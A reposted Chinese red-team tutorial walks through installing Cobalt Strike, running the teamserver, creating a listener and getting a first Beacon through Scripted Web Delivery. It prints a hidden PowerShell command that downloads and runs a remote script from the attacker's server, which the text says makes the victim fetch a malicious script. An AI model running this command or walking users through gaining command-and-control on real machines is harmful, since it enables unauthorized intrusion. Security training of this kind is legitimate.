---
title: 全网最全的Cobalt Strike使用教程系列-基础篇
url: https://www.secpulse.com/archives/189771.html
source: 安全脉搏
date: 2022-10-25
fetch_date: 2025-10-03T20:45:39.654668
---

# 全网最全的Cobalt Strike使用教程系列-基础篇

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# 全网最全的Cobalt Strike使用教程系列-基础篇

[工具](https://www.secpulse.com/archives/category/tools)

[hackctf](https://www.secpulse.com/newpage/author?author_id=34005)

2022-10-24

18,713

作者：C1ay，授权转载于国科漏斗社区。

**前言**

CS作为红队攻防中的热门工具，是入门红蓝攻防的必学工具之一，在斗哥学习和使用Cobalt Strike 的过程中，发现在网上很难找到较为详细且体系化的文章，因此斗哥本着带你进入攻防的奇妙世界的初衷，决定来写一写这个cs工具的使用教程，于是这个系列的文章就出现了。本篇作为基础篇主要内容是工具的安装和最初级的主机上线使用。
郑重声明：本系列文章的编写仅为了学习与交流，请勿将其中的技术用于违法途径。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-189771-1666601679.png)

**Cobalt Strike简介**

Cobalt Strike 是一款GUI的框架式渗透工具，集成了端口转发、服务扫描、自动化溢出、多模式端口监听、win exe木马生成、win dll木马生成，java木马生成，office宏病毒生成，木马捆绑；钓鱼攻击包括：站点克隆，目标信息获取，java执行，浏览器自动攻击等等。

Cobalt Strike: C/S架构的商业渗透软件，适合多人进行团队协作，可模拟APT做模拟对抗，进行内网渗透。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-189771-16666016791.png)

**安装Cobalt Strike**

### **3.1安装Java运行环境**

因为启动Cobalt Strike需要JDK的支持，所以需要安装Java环境。

java环境的安装可以参考：https://www.runoob.com/java/java-environment-setup.html

因为安装kali时，默认会安装java环境。我们可以通过java -version进行验证。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-189771-16666016792.png)

**3.2部署TeamServer**

在安装Cobalt Strike时，必须搭建团队服务器(也就是TeamServer服务器)。打开cobaltstrike文件夹，如下图所示：

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-189771-16666016793.png)

输入 “ls -l”命令，查看TeamServer 和 Cabalt Strike是否有执行权限。当前的TeamServer具备x的执行权限。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-189771-1666601680.png)

如果TeamServer 和 Cabalt Strike不具备x执行权限，可以通过如下命令进行添加。

```
chmod +x teamserver cobaltstrike
```

cobaltstrike 文件夹中有多个文件和文件夹。其功能如下。

●agscript：拓展应用的脚本。

●c2lint：用于检查profile 的错误和异常。

●teamserver：团队服务器程序。

●cobaltstrike 和 cobaltstrike.jar:客户端程序。因为teamserver文件是通过Java来调用CobaltStrike 的，所以直接在命令行环境中输入第一个文件的内容也能启动Cobalt Strike 客户端 (主要是为了方便操作)。

●logs:日志，包括 Web日志、Beacon日志、截图日志、下载日志、键盘记录日志等。

●datas：用于保存当前TeamServer的一些数据。

●update 和 update.jar：用于更新Cobalt Strike。

最后，运行团队服务器。在这里，需要设置当前主机的IP地址和团队服务器的密码。输入如下命令启动teamserver。

```
./teamserver 192.168.0.108 c1ay
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-189771-1666601681.png)

现在，Cobalt Strike团队服务器准备就绪。接下来，我们就可以启动Cobalt Strike客户端来连接团队服务器了。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-189771-16666016811.png)

**启动Cobalt Strike**

**4.1启动cobaltstrike.jar**

在Linux下，可以直接通过./cobaltstrike启动客户端，如下图。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-189771-16666016812.png)

填写团队服务器的IP地址、端口号、用户名、密码。在这里，登录的用户名可以任意输人，但要保证当前该用户名没有被用来登录Cobalt Strike服务器。

在确认信息填写无误后，点击Connect连接服务端，这时候会出现指纹校验对话框，如下图。指纹校验的主要作用是防篡改，且每次创建Cobalt Strike团队服务器时生成的指纹都不一样。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-189771-1666601682.png)

在客户端向服务器成功获取相关信息后，即可打开Cobalt Strike 主页面，Cobalt Strike 主页面主要分为菜单栏、快捷功能区、目标列表区、控制台命令输出区、控制台命令输入区。

菜单栏：集成了Cobalt Strike的所有功能。

快捷功能区：列出常用的功能。

目标列表：根据不同的显示模式，显示已获取权限的主机及目标主机。

控制台命令输出区：输出命令的执行结果。

控制台命令输人区：输入命令。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-189771-1666601683.png)

在Windows中，可以直接打开对应的客户端程序。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-189771-1666601684.png)

然后输入teamserver服务器的IP地址和密码进行连接即可。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-189771-16666016841.png)

**4.2利用Cobalt Strike 获取第一个Beacon**

1、建立Listener

可以通过菜单栏的第一个选项”Cobalt Strike”进人”Listeners” 面板，如下图。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-189771-1666601686.png)

也可以通过快捷功能区进入”Listeners” 面板，如下图。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-189771-1666601687.png)

单击“Add” 按钮，新建一个监听器，输人名称、监听器类型、团队服务器IP地址、监听的端口，然后单击“Save”按钮保存设置，如下图。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-189771-1666601688.png)

2、使用 Web Delivery 执行Payload

单击 “Attacks” 菜单，选择”Web Drive-by”→”Scripted Web Delivery”选项，如下图。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-189771-1666601689.png)

或者通过快捷功能区，打开“Scripted Web Delivery”窗口，如下图。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-189771-1666601690.png)

保持默认配置,选择已经创建的监听器，设置类型为PowerShell,然后单击“Launch”按钮，如下图。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-189771-1666601691.png)

最后，将Cobalt Strike生成的Payload完整地复制下来，如下图。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-189771-1666601692.png)

```
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.0.108:80/a'))"
```

其中url它是个文件路径，就是让目标 （受害者）通过这个地址和端口下载 恶意脚本。

访问这个url，可以看到是一段powershell代码，如下图。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-189771-16666016921.png)

3、在目标机器上执行Payload

执行Payload，Cobalt Strike 会收到一个Beacon，如下图。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-189771-1666601693.png)

执行以后，可以在Cobalt Strike的日志里面看到一条日志，如下图。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-189771-16666016931.png)

在Cobalt Strike 的主页面中可以看到一台机器上线（包含外网IP地址，内网IP地址、监听器、用户名、机器名、是否有特权、Beacon进程的PID、心跳时间等信息），如下图:

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-189771-1666601694.png)

4、与目标主机进行交互操作

单击右键，在弹出的快捷菜单中选中需要操作的Beacon，然后单击”Interact”选项，进入主机交互模式，如下图。

![](https://secpuls...